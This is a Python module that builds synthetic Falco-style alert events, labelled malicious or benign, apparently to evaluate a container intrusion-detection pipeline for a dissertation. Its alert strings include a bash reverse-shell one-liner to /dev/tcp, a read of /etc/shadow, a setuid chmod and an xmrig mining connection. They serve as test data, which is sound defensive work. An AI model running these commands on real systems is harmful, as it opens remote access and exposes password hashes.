"""
Synthetic Falco-shaped events for dissertation evaluation.

Each sample is a (payload, ground_truth) pair where ground_truth is ``malicious`` or ``benign``.
Payloads are compatible with ``normalize_sidekick_payload`` (rule, output, priority, time, output_fields).
"""

from __future__ import annotations

import random
import uuid
from datetime import datetime, timezone
from typing import Any, Literal

GroundTruth = Literal["malicious", "benign"]


def _ts() -> str:
    return datetime.now(timezone.utc).isoformat()


def _payload(
    *,
    rule: str,
    output: str,
    priority: str,
    container_id: str,
    tags: list[str] | None = None,
) -> dict[str, Any]:
    return {
        "rule": rule,
        "output": output,
        "priority": priority,
        "time": _ts(),
        "tags": tags or ["acsp-simulator"],
        "output_fields": {"container.id": container_id},
        "source": "simulator",
    }


def _privilege_escalation(cid: str) -> dict[str, Any]:
    return _payload(
        rule="Sudo potential privilege escalation",
        output="User executed sudo chmod 4777 on unexpected binary (simulator)",
        priority="error",
        container_id=cid,
        tags=["TA0004", "acsp-simulator", "privilege_escalation"],
    )


def _reverse_shell(cid: str) -> dict[str, Any]:
    return _payload(
        rule="Terminal shell in container",
        output="bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' (simulator reverse shell)",
        priority="critical",
        container_id=cid,
        tags=["T1059", "acsp-simulator", "reverse_shell"],
    )


def _suspicious_file_access(cid: str) -> dict[str, Any]:
    return _payload(
        rule="Read sensitive file untrusted",
        output="cat /etc/shadow invoked from non-root shell (simulator)",
        priority="warning",
        container_id=cid,
        tags=["T1003", "acsp-simulator", "sensitive_file"],
    )


def _crypto_mining(cid: str) -> dict[str, Any]:
    return _payload(
        rule="Detect crypto miners using the Stratum protocol",
        output="Process xmrig connected to stratum+tcp://pool.example:3333 (simulator)",
        priority="critical",
        container_id=cid,
        tags=["TA0040", "acsp-simulator", "crypto_mining"],
    )


def _benign(cid: str) -> dict[str, Any]:
    return _payload(
        rule="Known healthcheck parent",
        output="curl -fsS http://127.0.0.1:8080/health expected probe (simulator benign)",
        priority="notice",
        container_id=cid,
        tags=["healthcheck", "expected", "acsp-simulator", "benign"],
    )


_ATTACK_BUILDERS = (
    _privilege_escalation,
    _reverse_shell,
    _suspicious_file_access,
    _crypto_mining,
)


def generate_n_events(n: int, attack_ratio: float, *, rng: random.Random | None = None) -> list[tuple[dict[str, Any], GroundTruth]]:
    """
    Build ``n`` synthetic events with approximately ``attack_ratio`` malicious samples.

    Returns list of ``(falco_like_payload, true_label)`` for the full ACSP pipeline.
    """
    if n < 1:
        return []
    r = rng or random.Random()
    attack_ratio = max(0.0, min(1.0, attack_ratio))
    n_attack = int(round(n * attack_ratio))
    n_attack = max(0, min(n, n_attack))
    n_benign = n - n_attack

    malicious_payloads: list[dict[str, Any]] = []
    for i in range(n_attack):
        cid = f"sim-{uuid.uuid4().hex[:8]}"
        builder = _ATTACK_BUILDERS[i % len(_ATTACK_BUILDERS)]
        malicious_payloads.append(builder(cid))

    benign_payloads = [_benign(f"sim-{uuid.uuid4().hex[:8]}") for _ in range(n_benign)]

    labeled: list[tuple[dict[str, Any], GroundTruth]] = [(p, "malicious") for p in malicious_payloads]
    labeled.extend((p, "benign") for p in benign_payloads)
    r.shuffle(labeled)
    return labeled
